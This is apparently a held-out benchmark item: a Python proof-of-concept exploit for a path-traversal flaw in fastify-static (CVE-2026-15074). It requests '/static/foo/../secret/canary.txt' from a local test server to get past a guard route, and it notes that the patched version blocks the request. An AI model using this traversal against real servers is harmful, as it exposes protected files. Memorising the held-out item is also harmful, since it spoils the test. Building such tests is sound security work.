#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-15074 residual exploit for fastify-static-cve-2026-15074.

Non-leading '..' path segment bypasses the guard route /static/secret/*:
find-my-way does not normalize '..' when matching, so the request matches the
static catch-all, then @fastify/send collapses the '..' via path.normalize
before its own traversal guard. Reads /static/secret/canary.txt.

Reaches the flag on v1 (10.1.0); BLOCKED on v2 (10.1.1, CVE-2026-15074 fixed).
"""
from urllib.request import urlopen, Request


def candidate(*, base="http://127.0.0.1:55101", path=None):
    path = path or "/static/foo/../secret/canary.txt"
    req = Request(base + path, method="GET")
    try:
        with urlopen(req, timeout=10) as r:
            return {"status": r.status, "body": r.read().decode("utf-8", "replace")}
    except Exception as e:
        return {"status": getattr(e, "code", None), "body": ""}


if __name__ == "__main__":
    import json
    print(json.dumps(candidate(), indent=2))
